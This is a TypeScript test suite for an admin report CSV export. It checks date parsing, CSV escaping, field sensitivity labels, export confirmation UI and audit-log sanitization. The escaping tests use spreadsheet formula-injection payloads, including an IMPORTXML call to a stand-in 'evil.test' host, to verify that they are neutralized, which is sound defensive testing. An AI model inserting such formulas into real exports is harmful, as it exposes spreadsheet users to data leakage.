import assert from 'node:assert/strict'
import { readFileSync } from 'node:fs'
import { describe, it } from 'node:test'
import { join } from 'node:path'

import {
  ADMIN_REPORT_EXPORT_METADATA,
  escapeCsvValue,
  parseAdminReportRange,
} from '@/backend/admin/reports'
import {
  ADMIN_EXPORT_AUDIT_ERROR_CODES,
  ADMIN_EXPORT_AUDIT_METHOD,
  ADMIN_EXPORT_AUDIT_RESULTS,
  ADMIN_EXPORT_AUDIT_ROUTE,
  buildAdminExportAuditEvent,
  isAdminReportExportType,
} from '@/backend/admin/export-audit-log'
import { sanitizeSecurityEvent } from '@/backend/security/security-log'

const adminReportsPageSource = () =>
  readFileSync(join(process.cwd(), 'src/app/(admin)/admin/reports/page.tsx'), 'utf8')

const adminReportExportLinkSource = () =>
  readFileSync(
    join(process.cwd(), 'src/frontend/components/admin/AdminReportExportLink.tsx'),
    'utf8',
  )

const adminExportCsvHandlingGuideSource = () =>
  readFileSync(join(process.cwd(), 'docs/operations/ADMIN_EXPORT_CSV_HANDLING_GUIDE.md'), 'utf8')

type AdminReportMetadataKey = keyof typeof ADMIN_REPORT_EXPORT_METADATA

function fieldNames(type: AdminReportMetadataKey) {
  return ADMIN_REPORT_EXPORT_METADATA[type].fields.map((field) => field.name)
}

function fieldSensitivity(type: AdminReportMetadataKey, name: string) {
  const field = ADMIN_REPORT_EXPORT_METADATA[type].fields.find((item) => item.name === name)
  assert.ok(field, `Expected ${type}.${name} metadata`)
  return field.sensitivity
}

describe('admin report date range parsing', () => {
  it('uses explicit dates and normalizes the end date to end-of-day', () => {
    const range = parseAdminReportRange('2026-01-05T10:15:00', '2026-01-15T12:30:00')

    assert.equal(range.from.getFullYear(), 2026)
    assert.equal(range.from.getMonth(), 0)
    assert.equal(range.from.getDate(), 5)
    assert.equal(range.from.getHours(), 10)
    assert.equal(range.from.getMinutes(), 15)
    assert.equal(range.to.getFullYear(), 2026)
    assert.equal(range.to.getMonth(), 0)
    assert.equal(range.to.getDate(), 15)
    assert.equal(range.to.getHours(), 23)
    assert.equal(range.to.getMinutes(), 59)
    assert.equal(range.to.getSeconds(), 59)
    assert.equal(range.to.getMilliseconds(), 999)
  })

  it('falls back safely for missing dates', () => {
    const before = Date.now()
    const range = parseAdminReportRange()
    const after = Date.now()
    const thirtyDaysMs = 30 * 24 * 60 * 60 * 1000

    assert.ok(range.from.getTime() >= before - thirtyDaysMs - 1000)
    assert.ok(range.from.getTime() <= after - thirtyDaysMs + 1000)
    assert.equal(range.to.getHours(), 23)
    assert.equal(range.to.getMinutes(), 59)
    assert.equal(range.to.getSeconds(), 59)
    assert.equal(range.to.getMilliseconds(), 999)
  })

  it('falls back safely for invalid dates', () => {
    const before = Date.now()
    const range = parseAdminReportRange('not-a-date', 'also-not-a-date')
    const after = Date.now()
    const thirtyDaysMs = 30 * 24 * 60 * 60 * 1000

    assert.ok(range.from.getTime() >= before - thirtyDaysMs - 1000)
    assert.ok(range.from.getTime() <= after - thirtyDaysMs + 1000)
    assert.equal(range.to.getHours(), 23)
    assert.equal(range.to.getMinutes(), 59)
    assert.equal(range.to.getSeconds(), 59)
    assert.equal(range.to.getMilliseconds(), 999)
  })

  it('preserves reversed ranges for route compatibility', () => {
    const range = parseAdminReportRange('2026-02-10T00:00:00', '2026-01-01T00:00:00')

    assert.ok(range.from.getTime() > range.to.getTime())
  })
})

describe('admin report CSV escaping', () => {
  it('quotes commas and double quotes', () => {
    assert.equal(escapeCsvValue('Boilabin, Dhaka'), '"Boilabin, Dhaka"')
    assert.equal(escapeCsvValue('He said "yes"'), '"He said ""yes"""')
  })

  it('escapes spreadsheet formula prefixes', () => {
    assert.equal(escapeCsvValue('=IMPORTXML("https://evil.test")'), `"'=IMPORTXML(""https://evil.test"")"`)
    assert.equal(escapeCsvValue('+8801711222333'), "'+8801711222333")
    assert.equal(escapeCsvValue('  @cmd'), "'  @cmd")
    assert.equal(escapeCsvValue('-SUM(A1:A2)'), "'-SUM(A1:A2)")
    assert.equal(escapeCsvValue('\t=SUM(A1:A2)'), "'\t=SUM(A1:A2)")
  })

  it('handles empty and non-string values without widening the CSV contract', () => {
    assert.equal(escapeCsvValue(null), '')
    assert.equal(escapeCsvValue(undefined), '')
    assert.equal(escapeCsvValue(42), '42')
    assert.equal(escapeCsvValue(false), 'false')
  })

  it('quotes line breaks that could split CSV rows', () => {
    assert.equal(escapeCsvValue('Line one\nLine two'), '"Line one\nLine two"')
    assert.equal(escapeCsvValue('Line one\rLine two'), '"Line one\rLine two"')
  })
})

describe('admin report export sensitivity metadata', () => {
  it('covers the current report export types', () => {
    assert.deepEqual(Object.keys(ADMIN_REPORT_EXPORT_METADATA).sort(), [
      'customers',
      'orders',
      'products',
    ])
  })

  it('preserves the orders CSV field contract and sensitivity categories', () => {
    const orders = ADMIN_REPORT_EXPORT_METADATA.orders

    assert.deepEqual(fieldNames('orders'), [
      'orderNumber',
      'customer',
      'email',
      'status',
      'paymentStatus',
      'total',
      'createdAt',
    ])
    assert.equal(orders.containsCustomerPii, true)
    assert.equal(orders.containsPaymentOrOrderSensitiveData, true)
    assert.equal(orders.containsBusinessSensitiveData, false)
    assert.match(orders.permissionLabel, /order/i)
    assert.match(orders.warningLabel, /customer/i)
    assert.equal(fieldSensitivity('orders', 'customer'), 'customer-pii')
    assert.equal(fieldSensitivity('orders', 'email'), 'customer-pii')
    assert.equal(fieldSensitivity('orders', 'orderNumber'), 'payment-order-sensitive')
    assert.equal(fieldSensitivity('orders', 'paymentStatus'), 'payment-order-sensitive')
    assert.equal(fieldSensitivity('orders', 'total'), 'payment-order-sensitive')
    assert.equal(fieldSensitivity('orders', 'createdAt'), 'non-sensitive-operational')
  })

  it('preserves the products CSV field contract and business sensitivity categories', () => {
    const products = ADMIN_REPORT_EXPORT_METADATA.products

    assert.deepEqual(fieldNames('products'), [
      'name',
      'sku',
      'category',
      'stockQuantity',
      'soldCount',
      'isActive',
    ])
    assert.equal(products.containsCustomerPii, false)
    assert.equal(products.containsPaymentOrOrderSensitiveData, false)
    assert.equal(products.containsBusinessSensitiveData, true)
    assert.match(products.permissionLabel, /business/i)
    assert.match(products.warningLabel, /stock/i)
    assert.equal(fieldSensitivity('products', 'name'), 'non-sensitive-operational')
    assert.equal(fieldSensitivity('products', 'category'), 'non-sensitive-operational')
    assert.equal(fieldSensitivity('products', 'sku'), 'unknown-needs-policy')
    assert.equal(fieldSensitivity('products', 'stockQuantity'), 'business-sensitive')
    assert.equal(fieldSensitivity('products', 'soldCount'), 'business-sensitive')
    assert.equal(fieldSensitivity('products', 'isActive'), 'business-sensitive')
  })

  it('preserves the customers CSV field contract and highest PII risk labels', () => {
    const customers = ADMIN_REPORT_EXPORT_METADATA.customers

    assert.deepEqual(fieldNames('customers'), [
      'name',
      'email',
      'phone',
      'role',
      'isActive',
      'orders',
      'reviews',
      'createdAt',
    ])
    assert.equal(customers.containsCustomerPii, true)
    assert.equal(customers.containsPaymentOrOrderSensitiveData, false)
    assert.equal(customers.containsBusinessSensitiveData, false)
    assert.match(customers.reportSensitivityLabel, /highest pii risk/i)
    assert.match(customers.permissionLabel, /pii/i)
    assert.match(customers.warningLabel, /contact/i)
    assert.equal(fieldSensitivity('customers', 'name'), 'customer-pii')
    assert.equal(fieldSensitivity('customers', 'email'), 'customer-pii')
    assert.equal(fieldSensitivity('customers', 'phone'), 'customer-pii')
    assert.equal(fieldSensitivity('customers', 'orders'), 'customer-pii')
    assert.equal(fieldSensitivity('customers', 'reviews'), 'customer-pii')
    assert.equal(fieldSensitivity('customers', 'role'), 'unknown-needs-policy')
    assert.equal(fieldSensitivity('customers', 'isActive'), 'unknown-needs-policy')
    assert.equal(fieldSensitivity('customers', 'createdAt'), 'unknown-needs-policy')
  })

  it('provides UI-ready warning labels for every report export', () => {
    const expectations = {
      orders: [/customer/i, /order/i, /payment/i],
      products: [/business/i, /stock/i, /sales/i],
      customers: [/customer/i, /pii/i, /contact/i],
    } satisfies Record<AdminReportMetadataKey, RegExp[]>

    for (const [type, requiredTerms] of Object.entries(expectations) as Array<
      [AdminReportMetadataKey, RegExp[]]
    >) {
      const metadata = ADMIN_REPORT_EXPORT_METADATA[type]
      const uiCopy = `${metadata.reportSensitivityLabel} ${metadata.warningLabel}`

      assert.ok(metadata.reportSensitivityLabel.trim())
      assert.ok(metadata.warningLabel.trim())

      for (const term of requiredTerms) {
        assert.match(uiCopy, term)
      }
    }
  })

  it('wires export confirmation through existing metadata without changing export hrefs', () => {
    const pageSource = adminReportsPageSource()

    assert.match(pageSource, /AdminReportExportLink/)
    assert.match(pageSource, /reportSensitivityLabel=\{item\.metadata\.reportSensitivityLabel\}/)
    assert.match(pageSource, /warningLabel=\{item\.metadata\.warningLabel\}/)
    assert.match(pageSource, /href: `\/api\/admin\/reports\/export\?type=orders&\$\{exportQuery\}`/)
    assert.match(pageSource, /href: `\/api\/admin\/reports\/export\?type=products&\$\{exportQuery\}`/)
    assert.match(pageSource, /href: `\/api\/admin\/reports\/export\?type=customers&\$\{exportQuery\}`/)
  })

  it('keeps the export confirmation client-side and cancelable without route calls', () => {
    const componentSource = adminReportExportLinkSource()

    assert.match(componentSource, /^'use client'/)
    assert.match(componentSource, /href=\{href\}/)
    assert.match(componentSource, /aria-label=\{`\$\{label\}: \$\{reportSensitivityLabel\}`\}/)
    assert.match(componentSource, /title=\{warningLabel\}/)
    assert.match(componentSource, /window\.confirm\(confirmationMessage\)/)
    assert.match(componentSource, /event\.preventDefault\(\)/)
    assert.match(componentSource, /buildAdminReportExportConfirmationMessage/)
    assert.doesNotMatch(componentSource, /fetch\(/)
    assert.doesNotMatch(componentSource, /buildAdminReportCsv|getAdminReportData|db\./)
  })

  it('keeps confirmation copy metadata-driven without assuming CSV payload contents', () => {
    const componentSource = adminReportExportLinkSource()

    assert.match(componentSource, /label,/)
    assert.match(componentSource, /reportSensitivityLabel,/)
    assert.match(componentSource, /warningLabel,/)
    assert.match(componentSource, /Only continue if you are prepared to handle the export securely\./)
    assert.doesNotMatch(componentSource, /orderNumber|paymentStatus|stockQuantity|soldCount/)
  })

  it('keeps the confirmation guard as navigation-only UI, not route enforcement', () => {
    const componentSource = adminReportExportLinkSource()

    assert.match(componentSource, /<Link/)
    assert.doesNotMatch(componentSource, /router\.push|redirect\(|NextResponse|Response\.json/)
    assert.doesNotMatch(componentSource, /permission|role|session|auth/)
  })

  it('documents CSV handling guidance without changing export behavior', () => {
    const pageSource = adminReportsPageSource()
    const guideSource = adminExportCsvHandlingGuideSource()

    assert.match(pageSource, /Admin Export CSV\s+Handling Guide/)
    assert.match(guideSource, /may contain customer PII/)
    assert.match(guideSource, /Do not share CSV exports in public chats/)
    assert.match(guideSource, /Delete local CSV exports when they are no longer needed/)
    assert.match(guideSource, /Do not store downloaded CSV exports in repo folders/)
    assert.match(guideSource, /future provider\/security decision/)
    assert.match(guideSource, /operational guidance, not legal advice/)
    assert.doesNotMatch(guideSource, /DATABASE_URL|SHADOW_DATABASE_URL|password|token|secret/i)
  })
})

describe('admin export audit event helper', () => {
  it('builds a sanitized no-DB event from static export metadata', () => {
    const event = buildAdminExportAuditEvent({
      result: 'success',
      reportType: 'orders',
      statusCode: 200,
      actorRole: 'SUPER_ADMIN',
      timestamp: '2026-06-04T10:00:00.000Z',
    })

    assert.equal(event.type, 'admin_export_success')
    assert.equal(event.timestamp, '2026-06-04T10:00:00.000Z')
    assert.equal(event.severity, 'info')
    assert.equal(event.route, ADMIN_EXPORT_AUDIT_ROUTE)
    assert.equal(event.method, ADMIN_EXPORT_AUDIT_METHOD)
    assert.equal(event.statusCode, 200)
    assert.equal(event.userRole, 'SUPER_ADMIN')
    assert.deepEqual(event.metadata, {
      result: 'success',
      reportTypeValid: true,
      reportType: 'orders',
      containsCustomerPii: ADMIN_REPORT_EXPORT_METADATA.orders.containsCustomerPii,
      containsBusinessSensitiveData:
        ADMIN_REPORT_EXPORT_METADATA.orders.containsBusinessSensitiveData,
      containsPaymentOrOrderSensitiveData:
        ADMIN_REPORT_EXPORT_METADATA.orders.containsPaymentOrOrderSensitiveData,
    })

    const sanitized = sanitizeSecurityEvent(event)
    assert.equal(sanitized.type, event.type)
    assert.equal(sanitized.route, event.route)
    assert.equal(sanitized.method, event.method)
    assert.equal(sanitized.statusCode, event.statusCode)
    assert.equal(sanitized.userRole, event.userRole)
    assert.equal(sanitized.metadata?.reportType, 'orders')
  })

  it('omits invalid report types and unsupported actor details', () => {
    const event = buildAdminExportAuditEvent({
      result: 'blocked',
      reportType: 'orders?customer=should-not-appear',
      statusCode: 400,
      errorCode: 'invalid_export_type',
      actorRole: 'admin@example.test',
      timestamp: '2026-06-04T10:00:00.000Z',
      actorEmail: 'admin@example.test',
      actorName: 'Admin Person',
      actorId: 'user_123',
      orderNumber: 'ORDER-123',
      customerId: 'customer_123',
      csvRow: 'raw,row,data',
      payload: { customer: 'Buyer Person' },
      rawBody: { exportedRows: ['raw,row,data'] },
      headers: { authorization: 'Bearer should-not-appear' },
    } as Parameters<typeof buildAdminExportAuditEvent>[0] & Record<string, unknown>)

    assert.equal(event.type, 'admin_export_failure')
    assert.equal(event.severity, 'warn')
    assert.equal(event.route, '/api/admin/reports/export')
    assert.equal(event.statusCode, 400)
    assert.equal(event.errorCode, 'invalid_export_type')
    assert.equal(event.userRole, undefined)
    assert.equal('actorEmail' in event, false)
    assert.equal('actorName' in event, false)
    assert.equal('actorId' in event, false)
    assert.equal('orderNumber' in event, false)
    assert.equal('customerId' in event, false)
    assert.equal('csvRow' in event, false)
    assert.equal('payload' in event, false)
    assert.equal('rawBody' in event, false)
    assert.equal('headers' in event, false)
    assert.deepEqual(event.metadata, {
      result: 'blocked',
      reportTypeValid: false,
    })

    const serialized = JSON.stringify(event)
    assert(!serialized.includes('?'))
    assert(!serialized.includes('should-not-appear'))
    assert(!serialized.includes('admin@example.test'))
    assert(!serialized.includes('Admin Person'))
    assert(!serialized.includes('user_123'))
    assert(!serialized.includes('ORDER-123'))
    assert(!serialized.includes('customer_123'))
    assert(!serialized.includes('raw,row,data'))
    assert(!serialized.includes('Buyer Person'))
    assert(!serialized.includes('Bearer'))
  })

  it('accepts only the current report export type enum', () => {
    assert.equal(isAdminReportExportType('orders'), true)
    assert.equal(isAdminReportExportType('products'), true)
    assert.equal(isAdminReportExportType('customers'), true)
    assert.equal(isAdminReportExportType('returns'), false)
    assert.equal(isAdminReportExportType('orders?from=2026-01-01'), false)
  })

  it('derives sensitivity flags for every report type from export metadata', () => {
    for (const type of Object.keys(ADMIN_REPORT_EXPORT_METADATA) as AdminReportMetadataKey[]) {
      const event = buildAdminExportAuditEvent({
        result: 'attempted',
        reportType: type,
        statusCode: 200,
      })
      const metadata = ADMIN_REPORT_EXPORT_METADATA[type]

      assert.equal(event.metadata.reportTypeValid, true)
      assert.equal(event.metadata.reportType, type)
      assert.equal(event.metadata.containsCustomerPii, metadata.containsCustomerPii)
      assert.equal(
        event.metadata.containsBusinessSensitiveData,
        metadata.containsBusinessSensitiveData,
      )
      assert.equal(
        event.metadata.containsPaymentOrOrderSensitiveData,
        metadata.containsPaymentOrOrderSensitiveData,
      )
    }
  })

  it('keeps route data pathname-only and never accepts raw query input', () => {
    const event = buildAdminExportAuditEvent({
      result: 'attempted',
      reportType: 'customers',
      route: 'https://boilabin.com/api/admin/reports/export?type=customers&from=raw',
      url: '/api/admin/reports/export?token=should-not-appear',
      from: '2026-01-01',
      to: '2026-01-31',
    } as Parameters<typeof buildAdminExportAuditEvent>[0] & Record<string, unknown>)

    assert.equal(event.route, ADMIN_EXPORT_AUDIT_ROUTE)
    assert.equal(event.method, ADMIN_EXPORT_AUDIT_METHOD)

    const serialized = JSON.stringify(event)
    assert(!serialized.includes('?'))
    assert(!serialized.includes('from='))
    assert(!serialized.includes('token='))
    assert(!serialized.includes('2026-01-01'))
    assert(!serialized.includes('2026-01-31'))
  })

  it('bounds result, error code, status code, and actor role values', () => {
    const event = buildAdminExportAuditEvent({
      result: 'downloaded_csv_with_raw_details',
      reportType: 'products',
      statusCode: 999,
      errorCode: 'database_error_with_raw_details',
      actorRole: 'CUSTOMER',
    })

    assert.deepEqual(ADMIN_EXPORT_AUDIT_RESULTS, ['attempted', 'success', 'blocked', 'failed'])
    assert.deepEqual(ADMIN_EXPORT_AUDIT_ERROR_CODES, [
      'invalid_export_type',
      'unauthorized',
      'forbidden',
      'export_failed',
    ])
    assert.equal(event.type, 'admin_export_failure')
    assert.equal(event.severity, 'warn')
    assert.equal(event.metadata.result, 'blocked')
    assert.equal(event.metadata.reportType, 'products')
    assert.equal(event.statusCode, undefined)
    assert.equal(event.errorCode, undefined)
    assert.equal(event.userRole, undefined)

    const serialized = JSON.stringify(event)
    assert(!serialized.includes('downloaded_csv_with_raw_details'))
    assert(!serialized.includes('database_error_with_raw_details'))
    assert(!serialized.includes('CUSTOMER'))
  })
})
